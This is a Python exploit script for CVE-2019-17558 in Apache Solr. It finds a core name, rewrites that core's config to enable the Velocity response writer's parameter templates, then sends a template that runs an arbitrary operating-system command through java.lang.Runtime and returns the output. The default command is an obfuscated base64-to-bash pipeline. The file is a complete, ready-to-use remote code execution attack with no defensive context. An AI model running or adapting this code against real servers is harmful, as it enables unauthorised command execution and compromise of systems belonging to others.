#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2020/7/31 9:34
# @Author  : 柠檬菠萝
# @Email   : yzpmihome@vip.qq.com
# @File    : CVE_2019_17558_Apache_Solr_Velocity.py

import sys
import json
import time
import requests


requests.packages.urllib3.disable_warnings()


class run(object):
    def __init__(self):
        self.name = "CVE_2019_17558_Apache_Solr_Velocity"
        self.name_payload = ""
        self.targetAddr = ""
        self.currentTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())


    def getname(self, targetAddr):
        """
            获取core_name
        :param targetAddr:传入请求地址，需要获取core_name
        :return:返回获取core_name
        """
        self.targetAddr = targetAddr
        self.targetAddr = self.targetAddr + "/solr/admin/cores?wt=json&indexInfo=false"
        try:
            conn = requests.request("GET", url=self.targetAddr)
        except requests.exceptions.RequestException as e:
            data = '{},地址无法访问!'.format(self.targetAddr)
            return {'status': 20000, 'data': data, 'type': 'status'}
        self.name_payload = "test"
        try:
            self.name_payload = list(json.loads(conn.text)["status"])[1]
            # print(name)
        except:
            pass
        return self.name_payload

    # 上传修改配置文件
    def Modifyconf(self, targetAddr, name_payload):
        targetAddr = targetAddr + "/solr/" + name_payload + "/config"
        #print(url)
        headers = {'Content-Type': 'application/json'}
        postDataIner = {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
        }
        postData = {"update-queryresponsewriter": postDataIner}
        conn = requests.post(
            url=targetAddr,
            json = postData,
            headers=headers
        )
        if conn.status_code != 200:
            command_data = '[-] Command Failed {}'.format(self.currentTime)
            return {'status': 20001, 'data': command_data, 'type': 'status'}

    def runCommond(self, targetAddr, payload, command="bash -c {echo,d2hvYW1p}|{base64,-d}|{bash,-i}"):
        if 'https://' in targetAddr:
            pass
        elif 'http://' in targetAddr:
            pass
        else:
            data = '您的输入有误,或者没有加HTTPS请求头!'
            return {'status': 20001, 'data': data, 'type': 'status'}

        if payload == 'CVE_2019_17558_Apache_Solr_Velocity':
            self.name_payload = run.getname(self, targetAddr)
            print(self.name_payload)
            if 20000 in self.name_payload.values():
                print(self.name_payload)
                return self.name_payload
            else:
                run.Modifyconf(self, targetAddr, self.name_payload)
                targetAddr = targetAddr +"/solr/" + self.name_payload + "/select?q=1&&wt=velocity&" \
                                                       "v.template=custom&v.template.custom=%23set($x=%27%27)+%23" \
                                                       "set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23" \
                                                       "set($chr=$x.class.forName(%27java.lang.Character%27))+%23" \
                                                       "set($str=$x.class.forName(%27java.lang.String%27))+%23" \
                                                       "set($ex=$rt.getRuntime().exec(%27" + command + "%27))+$ex.waitFor()+%23" \
                                                        "set($out=$ex.getInputStream())+%23" \
                                                        "foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
                try:
                    conn = requests.request("GET", targetAddr)
                    print("response:" + conn.text)
                except:
                    command_data = '[-] Command Failed {}'.format(self.currentTime)
                    return {'status': 20001, 'data': command_data, 'type': 'status'}
                else:
                    command_data = '[+] Command Successfull {}'.format(self.currentTime)
                    return {'status': 20000, 'data': command_data, 'type': 'status'}
        else:
            data = '您的输入有误,或者没有加HTTPS请求头!'
            return {'status': 20001, 'data': data, 'type': 'status'}